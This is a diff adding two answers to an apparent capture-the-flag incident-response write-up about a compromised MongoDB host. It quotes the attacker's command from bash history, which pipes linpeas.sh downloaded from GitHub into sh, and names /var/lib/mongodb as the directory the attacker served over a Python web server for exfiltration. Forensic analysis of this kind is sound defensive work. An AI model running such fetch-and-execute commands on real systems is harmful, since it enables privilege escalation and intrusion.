@@ -53,4 +53,15 @@ Ans: `2025-12-29 05:40:03`
 
 # Task 7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
 
+Reviewing the `.bash_history` file of the `mongoadmin` user, located under `/home/mongoadmin`, we identified the following commands executed by the attacker:
+
+![bashhist.png](/MangoBleedHTB/screenshots/bashhist.png)
+
+Ans: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+
+# Task 8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
+
+Based on the previous screenshot, the attacker appeared to be interested in the `/var/lib/mongodb` directory and attempted to start a Python HTTP server from this location, likely to facilitate the exfiltration of its contents.
+
+Ans: `/var/lib/mongodb`
 
